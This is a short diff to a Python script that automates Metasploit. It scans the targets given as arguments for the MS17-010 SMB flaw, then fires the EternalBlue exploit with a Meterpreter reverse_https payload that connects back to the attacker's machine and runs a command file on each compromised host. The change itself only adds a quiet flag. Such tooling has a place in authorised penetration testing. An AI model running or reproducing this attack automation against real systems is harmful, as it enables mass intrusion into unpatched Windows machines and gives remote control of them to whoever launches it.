@@ -9,8 +9,8 @@ def get_local_ip():
 	return ip
 
 def attack(target):
-	attack_cmd = 'msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; spool '+ spool_log + '; set RHOST ' + target + \
-		'; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST ' + local_ip + '; set AutoRunScript multi_console_command -r ' \
+	attack_cmd = 'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; spool '+ spool_log + '; set RHOST ' + target + \
+		'; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST ' + local_ip + '; set AutoRunScript multi_console_command -r' \
 		 + os.path.join(os.getcwd(), command_file) + '; show options; run;"'
 	print (attack_cmd)
 	os.system(attack_cmd)
@@ -35,7 +35,7 @@ targets = sys.argv[1]
 scan_log = "scanner.log"
 spool_log = "spool.log"
 command_file = "commands.rc"
-scan_cmd = 'msfconsole -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS ' + targets + '; show options; run; exit" | tee ' + scan_log
+scan_cmd = 'msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS ' + targets + '; show options; run; exit" | tee ' + scan_log
 local_ip = get_local_ip()
 
 print ("Target IP Address(es):", targets)
